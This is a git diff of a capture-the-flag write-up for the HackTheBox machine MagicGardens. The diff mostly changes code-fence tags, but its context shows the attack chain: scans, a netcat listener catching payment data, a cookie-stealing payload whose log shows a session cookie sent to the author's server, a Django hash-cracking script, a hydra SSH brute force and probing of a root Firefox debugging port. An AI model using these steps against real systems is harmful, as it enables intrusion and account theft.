@@ -23,7 +23,7 @@ cover:
 
 As usual, initiating an Nmap scan on this machine with the command **`nmap 10.10.11.9 -T4 -vv -p-`** yields the following output:
 
-```
+```jsx
 PORT     STATE SERVICE REASON
 22/tcp   open  ssh     syn-ack
 25/tcp   open  smtp    syn-ack
@@ -34,7 +34,7 @@ PORT     STATE SERVICE REASON
 
 I also conducted an aggressive scan on the ports, and here is the output for that:
 
-```
+```jsx
 PORT     STATE SERVICE  REASON         VERSION
 22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
 | ssh-hostkey: 
@@ -146,12 +146,11 @@ TRACEROUTE (using port 22/tcp)
 HOP RTT      ADDRESS
 1   86.15 ms 10.10.14.1
 2   90.57 ms magicgardens.htb (10.10.11.9)
-
 ```
 
 I ran Gobuster on the HTTP port to explore the web service for any potentially interesting findings or endpoints. Here's the output from Gobuster:
 
-```
+```bash
 /search               (Status: 301) [Size: 0] [--> /search/]
 /login                (Status: 301) [Size: 0] [--> /login/]
 /register             (Status: 301) [Size: 0] [--> /register/]
@@ -162,7 +161,6 @@ I ran Gobuster on the HTTP port to explore the web service for any potentially i
 /cart                 (Status: 301) [Size: 0] [--> /cart/]
 /logout               (Status: 301) [Size: 0] [--> /logout/]
 /check                (Status: 301) [Size: 0] [--> /check/]
-
 ```
 
 ## Initial Access
@@ -175,7 +173,7 @@ I visited the 'admin' page, which displayed 'Django Login,' indicating it's a lo
 
 I intercepted the request and modified it to redirect to my bank (netcat session), resulting in the following outcome:
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ nc -nvlp 6969
 listening on [any] 6969 ...
@@ -190,12 +188,11 @@ Content-Length: 133
 Content-Type: application/json
 
 {"cardname": "Caleb Daniel", "cardnumber": "5358966261393853", "expmonth": "Janurary", "expyear": "2029", "cvv": "081", "amount": 25}
-
 ```
 
 Not particularly useful in terms of gaining access, but we did identify that the web application is using Python Requests version 2.31.0. Perhaps we could attempt to create our own bank API with a similar structure required for the previous POST request and simulate a fake purchase to see if any vulnerabilities surface.
 
-```
+```bash
 ┌──(kali㉿kali)-[~/flask-bank-api]
 └─$ ls
 app.py
@@ -215,8 +212,7 @@ def handle_payment():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80, debug=True)
-
-                                                                                                                                                             
+                                                                                                                                                        
 ┌──(kali㉿kali)-[~/flask-bank-api]
 └─$ python app.py                                                                                 
  * Serving Flask app 'app'
@@ -251,7 +247,7 @@ The payload I used was: **`098f6bcd4621d373cade4e832627b4f6.0d341bcdc6746f1d452b
 
 I crafted this payload using the CyberChef website, then uploaded it to the message box. After waiting for a while, I successfully captured the cookie:
 
-```
+```bash
 10.10.11.9 - - [21/May/2024 09:48:22] "GET /?cookie=Y3NyZnRva2VuPXpPVGE3bUhxRzhZUGc1TVA1V3lLRFNzOGZQbVF2ZVFFOyBzZXNzaW9uaWQ9LmVKeE5qVTFxd3pBUWhaTkZRZ01waFp5aTNRaExsdU5vVjdydnFnY3draXhGYmhNSjlFUHBvdEFEekhKNjN6cHVBcDdkOTc3SG01X1Y3MjY1bU80YkgtR3VKQk85UEJ1RTFUbkVfSVd3VGxubWtzYmdMVXRyRVRhZlEzTGRhVWdaWVlHd25WQ0g0ck9KNk5hdzBUTG1mel9TZHFLWnZ1OWt5YTY3UE9xR0htSEpFSGF6VEVuOVlmd29udnAzNlktQjZPQnpIQlM1Vk1qVkp2SWFlbk42dVhVZlpnTk9Kb2Z3VEJ0dG1XMEZyVTNWY0diTWdXbFJLY1dwdElJeTJSeXFmYTF0MC1vOVZZcXB5ckNhRzA2MWFtdXVoY0JDX2dEZXMyWDc6MXM5UGxVOmMwZTRZaGJWVjlpem0yMVZudXl2YlNRR0NkcWI3VVlFbFhPMDlSVHpCSkU= HTTP/1.1" 200 -
 ```
 
@@ -261,7 +257,7 @@ Using the captured cookie, I successfully logged in to the Django admin login pa
 
 I discovered the password hash on the admin page and then proceeded to write the following script to crack it:
 
-```
+```python
 from passlib.hash import django_pbkdf2_sha256
 hash = 'HASH VALUE HERE' # enter the hash value here to decrypt
 rounds = hash.split('$')[1]
@@ -279,7 +275,7 @@ We also have the option to use hashcat, which successfully cracked the password 
 
 After some time, the password was successfully cracked:
 
-```
+```bash
 ┌──(kali㉿kali)-[~]
 └─$ hydra -l morty -P /usr/share/wordlists/rockyou.txt ssh://magicgardens.htb
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -306,7 +302,7 @@ I promptly SSHed to the user account, but to my surprise, there was no user.txt 
 
 Upon running Linpeas on the machine, I discovered a Firefox process running as root, with remote debugging enabled and configured to allow localhost on port 34001. This could potentially provide us with a means of further exploration and privilege escalation.
 
-```
+```bash
 root        1936  4.9 11.6 11875692 467716 ?     Sl   May20  16:51                  _ firefox-esr --marionette --headless --remote-debugging-port 34001 --remote-allow-hosts localhost -no-remote -profile /tmp/rust_mozprofileu1v0Uq
 ```
 
@@ -321,7 +317,7 @@ Once completed, we can access the Firefox remote debugging port at **`localhost:
 
 As observed, there is an **`httpd.js`** running on this port. I proceeded to attempt brute-forcing the directory, which uncovered various endpoints:
 
-```
+```jsx
 /trace                (Status: 200) [Size: 194]
 /json                 (Status: 200) [Size: 302]
 /session              (Status: 400) [Size: 61]
@@ -329,7 +325,7 @@ As observed, there is an **`httpd.js`** running on this port. I proceeded to att
 
 The "/trace" endpoint contains the following content:
 
-```
+```bash
 Request-URI: http://localhost:34001/trace
 
 Request (semantically equivalent, slightly reformatted):
@@ -351,7 +347,7 @@ sec-fetch-user: ?1
 
 The "/json" endpoint contains the following content:
 
-```
+```json
 [
   {
     "description": "",
@@ -371,7 +367,7 @@ To address this, I installed websocat, similar to netcat, on my target machine f
 
 After installation, I executed the following command:
 
-```
+```bash
 morty@magicgardens:/tmp$ curl http://127.0.0.1:34001/json/version
 {
         "Browser": "Firefox/115.10.0",
